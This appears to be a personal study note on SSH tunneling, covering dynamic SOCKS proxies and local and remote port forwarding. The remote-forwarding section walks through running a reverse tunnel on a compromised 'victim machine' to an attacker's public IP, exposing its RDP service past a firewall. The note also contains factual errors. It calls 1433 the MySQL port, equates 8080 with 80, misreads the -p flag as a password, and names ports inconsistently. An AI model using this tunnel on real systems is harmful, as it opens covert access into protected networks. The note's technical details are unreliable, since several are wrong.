# 5.2 SSH Tunneling

## SSH Tunneling

![](../../.gitbook/assets/image%20%2887%29.png)

* Here the,
  * delivery protocol is SSH on port 22.
  * and main communication happens on port 1433 \(default MySQL port\).

## There are three ways of SSH tunneling

1. Dynamic SSH tunneling
2. Local port forwarding using SSH tunneling
3. Remote port forwarding using SSH tunneling

## Dynamic SSH tunneling

* We need to setup a SOCKS proxy,
  * We first need a **proxy server on client side**.
  * We then need to configure the other end of the communication to accept traffic.
* We then need to either configure all application configurations manually or automatically to "tell all applications to use the client side SOCKS proxy for communication". 
* So all the requests of internet are now sent to proxy.

### Dynamic SSH tunneling using SSH

```text
ssh -D 85 user@192.168.1.1
```

* The above commands configures an SSH Tunnel
  * -D bind port. Which specifies the delivery connection port.
  * one end \(local\) of the SSH tunnel is the system where the above command is executed. the other end is 192.168.1.1 using username "user".

![SSH -D option description](../../.gitbook/assets/image%20%2822%29.png)

![SSH Tunneling - Dynamic](../../.gitbook/assets/image%20%2865%29.png)

* Here,
  * the delivery protocol is 22 \(SSH\)
  * and main communication protocol is 844.
* Examples of dynamic SSH tunneling are
  * Psiphon
  * Tor Browser

## SSH tunneling Local Port forwarding

* Unlike Dynamic SSH proxy server we do not have to create a client side proxy server here. Infact we do not need a proxy server. All things are done by SSH tunneling itself. 
* On our client machine we will open URL _http://127.0.0.1:8080_.
* Note that 8080 = 80. Actually by 8080 we are just asking to use http service.
* This request will be internally tunneled on port 53 by configured SSH tunnel.
* We have a similar relay server which helps as communicator.

![SSH Tunneling - Local Port forwarding](../../.gitbook/assets/image%20%2850%29.png)

### Example of local port forwarding

1. Remote desktop \(using vnc for ubuntu\)

## SSH Tunneling Remote Port forwarding

* Given we RDP ports are not allowed through firewall means 3389 and 2290 are blocked at firewall level.
* And given only port 53 is allowed.
* Given that the victim machine has RDP services active and running on port 3389.
* We will use SSH port tunneling technique to talk directly to the server. We do not need relay server in this kind of exploits.

### Working

* Suppose we have got access to victim machine which is inside a protect environment. The victim machine has a private IP address, so we cannot directly access RDP of machine.
* Given that in victim machine RDP service \(3389\) is running.
* We first create a reverse SSH Tunnel for tunneling port 3389 \(RDP port\). We need to run this command on the victim machine.
  * `ssh -R 7000:127.0.0.1:3389 user@212.33.40.5 -p abcd1234`
    * `abcd1234` is the password of the attacker machine
    * `212.33.40.5` is a public IP address of the attacker machine
    * `3389` is the mail communication protocol. The service is running on victim system.
    * `7000` is the port which the attacker will use to access the tunneled RDP connection.
* Once the SSH tunnel is created, a service is automatically started on the attacker machine \(note that we specified username and password of attacker machine\). 
  * `service : 0.0.0.0:7000`
* Now to access the remote console of the victim system.
  * `rdesktop 127.0.0.1:7000`

![](../../.gitbook/assets/image%20%2889%29.png)



